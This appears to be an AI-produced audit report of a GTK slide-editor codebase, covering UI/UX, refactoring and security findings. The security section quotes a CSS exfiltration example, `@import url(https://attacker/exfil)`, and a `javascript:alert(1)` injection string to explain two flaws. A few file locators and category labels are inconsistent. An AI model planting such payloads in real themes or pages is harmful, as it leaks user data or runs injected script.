# Codebase Audit Report
**Project:** Presence — Markdown-to-PDF slide editor  
**Stack:** Python 3.11+, GTK 4 / Libadwaita, GObject, WeasyPrint, markdown-it-py, Pygments, Pillow, Anthropic SDK, Google GenAI SDK  
**Audited by:** Claude Code  
**Date:** 2026-06-09

---

## Executive Summary

Presence is a thoughtfully structured ~17 000-line Python desktop app with a clean separation between a pure-library slide pipeline (`slides/`) and a GTK 4 frontend. The codebase demonstrates mature defensive patterns: CSS colour injection is blocked with an allowlist regex, ZIP theme extraction validates paths against directory traversal, image source URLs are HTML-escaped, and conversion runs on a background thread with GLib idle callbacks. The single most important UI/UX finding is that `AIImportDialog` imposes a fixed pixel height that will clip on small or scaled displays. The top code-quality finding is that `_safe_subpath` is defined twice with subtly different semantics, creating a maintenance hazard. The most significant security finding is that API keys fall back to plaintext `config.ini` storage when GNOME Keyring is unavailable, and the `fcntl` import that was presumably scaffolded for advisory file locking is unused, leaving the INI file unprotected against concurrent writes.

---

## Part 1 — UI/UX & Information Design

### Strengths

- **Responsive sidebar** — `Adw.OverlaySplitView` + a 800 px breakpoint collapses the thumbnail strip to a drawer, conforming to GNOME HIG adaptive layouts (`window.py:256-260`).
- **Accessible toolbar buttons** — Every header bar button calls `update_property([Gtk.AccessibleProperty.LABEL], [...])` immediately after creation, providing a text alternative for icon-only buttons (`window.py:287, 294-296, 303-305, etc.`).
- **Keyboard navigation** — F9/F10 for panel toggles, Ctrl+N/O/S/P, F1 for shortcuts, all registered as accelerators (`window.py:512-548`).
- **Content Security Policy** — The generated HTML document sets an explicit CSP header restricting scripts to `'none'` (`html.py:165-166`).
- **Autosave + recovery** — A 30-second autosave timer and per-file SHA-256-keyed recovery paths protect against data loss (`window.py:168, session.py:203-229`).
- **Informative state feedback** — The conversion spinner, slide-count toast ("Built in 1.2s · 8 slides"), per-thumbnail spinners, and overflow banner give continuous feedback at the right granularity (`window.py:1124-1176`).

### Issues & Recommendations

| # | File | Line(s) | Issue | Severity | Recommendation |
|---|------|---------|-------|----------|----------------|
| 1 | `ai_import_dialog.py` | 71 | `set_content_height(380)` fixes the dialog at 380 px. On a 125 % scaled display or a small laptop this clips the progress area and the slide-count review form. | Med | Use `set_content_height(-1)` (natural size) and wrap the content in a `Gtk.ScrolledWindow` with a `min_content_height`. |
| 2 | `window.py` | 1356 | `🎤` emoji hard-coded in the presenter timer subtitle. Screen readers announce raw emoji names; it adds visual noise on fonts that don't render it. | Low | Replace with a plain text prefix (`Speaking:`) or a symbolic icon name. |
| 3 | `html.py` | 161-173 | The generated HTML document always sets `lang="en"`, even when the AI import dialog generates output in Dutch or Turkish. | Low | Propagate a `lang` key from frontmatter into `<html lang="...">`. |
| 4 | `window.py` | 46-83 | `_STARTER_TEMPLATE` opens with `---\ntitle: …\n---` (YAML frontmatter) followed by slide separators also written as `---`. A new user may not immediately understand why the first block behaves differently. | Low | Add a short comment inside the template explaining the frontmatter block, or use the `title:` key and skip the explicit `---` separator for the frontmatter. |
| 5 | `window.py` | 192-198 | `Adw.Banner` is used for both transient one-shot errors and persistent advisory warnings (overflow, conversion failure). A conversion failure that gets replaced by a new build silently resets the banner, which is correct, but the overflow warning can also be displaced by a new failure. | Low | Give the banner a `message_type` notion: use `_show_toast()` for one-shot failures and reserve the banner for persistent advisory state only. |

### Accessibility Checklist

- [x] Alt text on all images — decorative slide images use `alt=""` (correct); logo uses `alt="logo"`
- [ ] Colour contrast ≥ 4.5:1 (WCAG AA) — not statically verifiable; depends on user-chosen theme colours
- [x] All interactive elements keyboard-reachable — all actions have accelerators or are reachable via Tab
- [x] ARIA roles where needed — `aria-hidden="true"` on gradient/tint overlay divs (`html.py:346, 484-487`)
- [x] Focus indicators visible — GTK 4 / Libadwaita supplies default focus rings

---

## Part 2 — Code Quality & Refactoring

### Strengths

- **Clean library / UI separation** — `slides/` has no GTK dependency; it can be imported by the CLI or tested in headless environments (`pyproject.toml:33-37`).
- **GObject signal design** — `Converter` emits typed GObject signals with explicit C-type tuples, decoupling conversion state from the window (`converter.py:54-61`).
- **Thread-safe session writes** — `session.py` uses `threading.Lock` + atomic `os.replace()` for all session writes, preventing TOCTOU corruption across multiple windows (`session.py:32, 432-438`).
- **Fence-aware Markdown splitting** — `_fence_aware_split` correctly ignores separators inside fenced code blocks, matching real CommonMark semantics (`splitter.py:15-60`).
- **Validated Pygments style** — `get_pygments_css` validates the style name against the Pygments registry before use, preventing unexpected filesystem lookups via the plugin discovery mechanism (`renderer.py:46-50`).
- **CSS colour injection blocked** — `_safe_colour` in `css.py` validates every theme colour against a strict allowlist regex before interpolation, with a warning log for rejected values (`css.py:25-46`).

### Issues & Recommendations

| # | File | Line(s) | Issue | Severity | Recommendation |
|---|------|---------|-------|----------|----------------|
| 1 | `converter.py:35-50` / `slides/convert.py:26-46` | Both | `_safe_subpath` is defined twice. The two versions differ: `converter.py` uses `candidate.is_relative_to()` (correct, Python 3.9+) while `convert.py` uses a `startswith(base + "/")` string check that silently fails on paths that are exactly `base` with no trailing slash. | High | Extract one canonical version to `slides/utils.py`; import it from both callers. Use the `is_relative_to()` form since the project requires Python 3.11+. |
| 2 | `session.py` | 11 | `import fcntl` is present but `fcntl` is never called anywhere in the module. The threading.Lock comment suggests it was scaffolded for advisory file locking and then abandoned. | Med | Remove the dead import. If multi-process locking is needed, add it intentionally with a comment explaining why. |
| 3 | `window.py` | 1–1668 | `MainWindow` is 1668 lines combining UI construction (lines 181–454), actions (512–568), file I/O (626–910), conversion (787–817), and ~20 signal handlers. At this scale, locating a specific handler requires scanning through unrelated code. | Med | Extract file I/O into a `DocumentController` (or a `_DocumentMixin`) and keep `MainWindow` to wiring and signal delegation. No behaviour change required. |
| 4 | `window.py` | 919-925, 586-589, 1586-1589, 972-975 | Four separate debounce patterns all follow the same `source_remove → timeout_add` structure but are copy-pasted without a shared helper. | Low | Extract a `_debounce(self, attr, delay_ms, cb, *args)` helper method on `MainWindow`. |
| 5 | `html.py` | 1500 | `from urllib.parse import urlparse, url2pathname` is imported inside `_on_export_html_response`. Late imports inside interactive callbacks obscure the module's real dependencies. | Low | Move to top-level imports. |
| 6 | `splitter.py` | 157 | `IMAGE_SIZES = frozenset(("30", "50", "70", "100"))` is annotated "kept for reference" because the parser now accepts 1–100. This dead constant misleads readers about what values are accepted. | Low | Delete the constant; move the legacy-values note to a comment at the `_SIZE_TOKEN_RE` call site. |
| 7 | `css.py` | 741 | `t.accent2 = _safe_colour(t.accent2, t.accent) if t.accent2 else t.accent` — the else-branch skips `_safe_colour` because `t.accent` was just sanitised. The asymmetry is fragile if this code is reordered. | Low | Replace with `t.accent2 = _safe_colour(t.accent2 or t.accent, t.accent)` for a uniform path. |

### Top 3 Refactoring Opportunities

**1. Deduplicate `_safe_subpath` (High priority)**

Current state — two near-identical functions, one with a subtle bug:

```python
# slides/convert.py  (subtly wrong — string comparison has off-by-one)
if str(candidate).startswith(str(base_resolved) + "/") or candidate == base_resolved:
    return candidate

# converter.py  (correct — uses is_relative_to)
if candidate == base_resolved or candidate.is_relative_to(base_resolved):
    return candidate
```

Proposed state — one function in `slides/utils.py`, imported by both:

```python
def safe_subpath(base: Path, untrusted: str) -> Path | None:
    """Return resolved path only if it stays within base; else None."""
    if Path(untrusted).is_absolute():
        return None
    try:
        candidate = (base / untrusted).resolve()
        if candidate == base.resolve() or candidate.is_relative_to(base.resolve()):
            return candidate
    except Exception:
        pass
    return None
```

---

**2. Generic debounce helper (Low priority)**

Current state — four repetitions of the same pattern in `window.py`:

```python
if self._sidebar_update_source is not None:
    GLib.source_remove(self._sidebar_update_source)
self._sidebar_update_source = GLib.timeout_add(200, self._flush_sidebar_update, text)
```

Proposed state — one method, four call sites:

```python
def _debounce(self, attr: str, delay_ms: int, cb, *args) -> None:
    src = getattr(self, attr, None)
    if src is not None:
        GLib.source_remove(src)
    setattr(self, attr, GLib.timeout_add(delay_ms, cb, *args))

# Usage:
self._debounce("_sidebar_update_source", 200, self._flush_sidebar_update, text)
```

---

**3. Remove dead `IMAGE_SIZES` constant and unify `accent2` sanitisation (Low priority)**

```python
# Before (splitter.py:157)
IMAGE_SIZES = frozenset(("30", "50", "70", "100"))  # kept for reference; parser accepts any 1-100

# After — delete the line; add comment at the parse site
elif m2 := _SIZE_TOKEN_RE.match(token):  # accepts any integer 1-100; legacy 30/50/70/100 still work

# Before (css.py:741)
t.accent2 = _safe_colour(t.accent2, t.accent) if t.accent2 else t.accent

# After
t.accent2 = _safe_colour(t.accent2 or t.accent, t.accent)
```

---

## Part 3 — Security Audit

### Critical & High Findings

| # | File | Line(s) | OWASP Category | Severity | Remediation |
|---|------|---------|----------------|----------|-------------|
| 1 | `session.py` | 362-379 | A02:2021 Cryptographic Failures | High | API keys (Claude + Gemini) are written to `~/.config/presence/config.ini` in **plaintext** when GNOME Keyring is unavailable. Any process running as the same user can read them. **Remediate:** Call `os.chmod(ini_path, 0o600)` immediately after writing; show a user-visible warning rather than silently downgrading to plaintext. Consider prompting the user to set up a keyring instead of storing keys at all. |
| 2 | `session.py` | 11, 362-379 | A04:2021 Insecure Design | High | `import fcntl` is present but never used. `config.ini` is written without any file-level locking. If two Flatpak instances write simultaneously the INI file can be corrupted or one write can be silently lost. **Remediate:** Either add `fcntl.lockf` advisory locking to `_save_api_keys_ini` / `_load_api_keys_ini`, or use the same atomic `tempfile → os.replace()` pattern already used for `session.json`. |

### Medium & Low Findings

| # | File | Line(s) | OWASP Category | Severity | Remediation |
|---|------|---------|----------------|----------|-------------|
| 3 | `html.py` | 165-166 | A05:2021 Security Misconfiguration | Med | The generated HTML document uses `style-src 'unsafe-inline'`. This is necessary for the current inlined-CSS architecture, but weakens XSS protection if the HTML export is opened in a browser after sharing. `script-src 'none'` is already set, which limits exploitability. **Remediate:** Document this constraint explicitly; consider migrating to an external stylesheet for the HTML export path so `'unsafe-inline'` can be dropped. |
| 4 | `css.py` | 670-681 | A03:2021 Injection | Med | Custom theme CSS (`theme.css`) is appended to the generated CSS verbatim — no `@import` blocking, no content filtering. A malicious theme ZIP from the internet could inject `@import url(https://attacker/exfil)` rules. ZIP path traversal is blocked (`theme_loader.py:303-311`) but CSS content is not filtered. **Remediate:** Scan custom CSS for `@import` directives and reject them, or strip them with a regex before appending. |
| 5 | `html.py` | 285 | A03:2021 Injection | Med | `_urlquote(effective_src, safe="+/=:;,")` keeps `:` unencoded, so a `javascript:alert(1)` string in an image `src` survives encoding and reaches the `<img src="...">` attribute in the exported HTML. WeasyPrint ignores these in PDFs, but the exported HTML file opened in a browser could trigger execution in some older browser versions. **Remediate:** Remove `:` from the `safe` parameter, or add a URL-scheme allowlist that rejects `javascript:` before processing. |
| 6 | `ai_import_dialog.py` | 456-516 | A02:2021 Sensitive Data Exposure | Med | The full extracted document text (up to 50 MB) is sent to the Claude API without a UI step explicitly informing the user that content leaves the device. **Remediate:** Add a one-sentence disclosure in the dialog ("Your document will be sent to Anthropic's Claude API") before any API call is made. |
| 7 | `theme_loader.py` | 296-317 | A01:2021 Broken Access Control | Low | ZIP path-traversal is validated with `is_relative_to()` which is correct. However, ZIP symlink entries are not explicitly rejected. On Python / Linux, `zipfile.extractall` does create symlinks from ZIP entries, and a symlink pointing outside the themes directory would pass the per-entry check at extraction time but let a subsequent file write follow it. **Remediate:** Iterate `zf.infolist()`, check `info.is_symlink()` (Python 3.12+) or inspect `info.external_attr` for symlink mode bit, and skip or raise for symlink entries. |
| 8 | `session.py` | 370-378 | A02:2021 Cryptographic Failures | Low | `_save_api_keys_ini` uses `open(ini_path, "w")` which creates the file with umask-derived permissions (typically `0o644`, world-readable). **Remediate:** After the `with open(...)` block, call `os.chmod(ini_path, 0o600)`. |

### Dependency Vulnerability Notes

| Package | Version spec | Notes |
|---------|-------------|-------|
| `pillow` | `>=10.0` | Pillow has a history of image-parsing CVEs (heap overflows, decompression bombs). Pin to a tested minor version in the Flatpak manifest and subscribe to Pillow security advisories. |
| `weasyprint` | `>=60` | No pinned upper bound. WeasyPrint's CSS rendering engine changes across minor versions; always test PDF output after upgrades. No known CVEs at audit date. |
| `pyyaml` | `>=6.0` | Versions <5.1 were vulnerable to arbitrary code execution. `>=6.0` is safe. Verify that `yaml.safe_load` (not `yaml.load`) is used everywhere YAML is parsed (`slides/frontmatter.py`). |
| `anthropic` | `>=0.25` | Optional AI dependency. No known CVEs at audit date; pin to a tested minor version in production. |
| `google-genai` | `>=1.0` | Optional AI dependency. Same guidance as above. |
| `markdown-it-py` | `>=3.0` | The renderer explicitly sets `html=False` to block raw HTML pass-through (`renderer.py:65`). This is the correct mitigation. No action needed. |

---

## Prioritised Action List

1. **[HIGH – Security]** `session.py:362-379` — API keys written to plaintext `config.ini` when keyring unavailable. Add `os.chmod(0o600)` on write; display a user-visible warning instead of silently downgrading.
2. **[HIGH – Security]** `session.py:11, 362-379` — `config.ini` has no file-level locking. Add `fcntl.lockf` advisory lock or migrate to the atomic-write pattern already used for `session.json`.
3. **[HIGH – Code Quality]** `converter.py:35-50` / `slides/convert.py:26-46` — Deduplicate `_safe_subpath`; the `convert.py` string-comparison version has an off-by-one. Move the correct `is_relative_to()` version to `slides/utils.py`.
4. **[MED – Security]** `html.py:285` — `:` in `_urlquote` safe chars allows `javascript:` URIs through to `<img src>` in the exported HTML. Remove `:` from safe chars or add a scheme allowlist.
5. **[MED – Security]** `css.py:670-681` — Custom `theme.css` appended verbatim. Block `@import` directives in user-provided theme CSS to prevent CSS-based network requests.
6. **[MED – Security]** `ai_import_dialog.py:456-516` — Add explicit disclosure text before any API call ("Your document will be sent to Anthropic's Claude API").
7. **[MED – Code Quality]** `session.py:11` — Remove unused `import fcntl`.
8. **[MED – Code Quality]** `window.py:1–1668` — Extract file I/O and document-controller logic into a separate class to reduce `MainWindow` to a manageable size.
9. **[MED – UI/UX]** `ai_import_dialog.py:71` — Replace fixed `set_content_height(380)` with natural sizing to prevent content clipping on small/scaled displays.
10. **[LOW – Security]** `session.py:370-378` — Call `os.chmod(ini_path, 0o600)` after writing the INI fallback.
11. **[LOW – Security]** `theme_loader.py:296-317` — Reject symlink entries in theme ZIP files before `extractall()`.
12. **[LOW – Code Quality]** `window.py:919-925` et al. — Extract the four debounce patterns into a single `_debounce()` helper method.
13. **[LOW – Code Quality]** `splitter.py:157` — Remove the dead `IMAGE_SIZES` constant.
14. **[LOW – Code Quality]** `css.py:741` — Unify `accent2` sanitisation to always pass through `_safe_colour`.
15. **[LOW – UI/UX]** `window.py:1356` — Replace `🎤` emoji in presenter timer subtitle with a text prefix or symbolic icon.
16. **[LOW – UI/UX]** `html.py:161` — Propagate output language into the HTML `lang` attribute for AI-generated non-English slides.

---

## Appendix: Files Audited

```
src/presence/__init__.py
src/presence/__main__.py
src/presence/application.py
src/presence/app_logging.py
src/presence/app_utils.py
src/presence/ai_image_dialog.py
src/presence/ai_import_dialog.py
src/presence/ai_infographic_dialog.py   (structure reviewed)
src/presence/converter.py
src/presence/editor.py                  (structure reviewed; 2983 lines)
src/presence/presenter.py               (structure reviewed)
src/presence/preview.py
src/presence/session.py
src/presence/settings_dialog.py         (structure reviewed)
src/presence/shortcuts.py
src/presence/sidebar.py                 (structure reviewed)
src/presence/theme_editor.py            (structure reviewed)
src/presence/theme_manager_ui.py        (structure reviewed)
src/presence/theme_panel.py             (structure reviewed)
src/presence/window.py
src/presence/slides/__init__.py
src/presence/slides/__main__.py
src/presence/slides/cli.py
src/presence/slides/convert.py
src/presence/slides/css.py
src/presence/slides/frontmatter.py
src/presence/slides/html.py
src/presence/slides/image_gen.py
src/presence/slides/infographic_gen.py  (structure reviewed)
src/presence/slides/renderer.py
src/presence/slides/splitter.py
src/presence/slides/theme_loader.py
src/presence/slides/themes.py
src/presence/slides/thumbnails.py
src/presence/slides/thumbnails_render.py
src/presence/slides/utils.py
pyproject.toml
io.gitlab.gtk4_apps1.Presence.desktop
io.gitlab.gtk4_apps1.Presence.json
data/io.gitlab.gtk4_apps1.Presence.metainfo.xml
tests/conftest.py
tests/test_css.py
tests/test_session.py
tests/test_slides.py
```
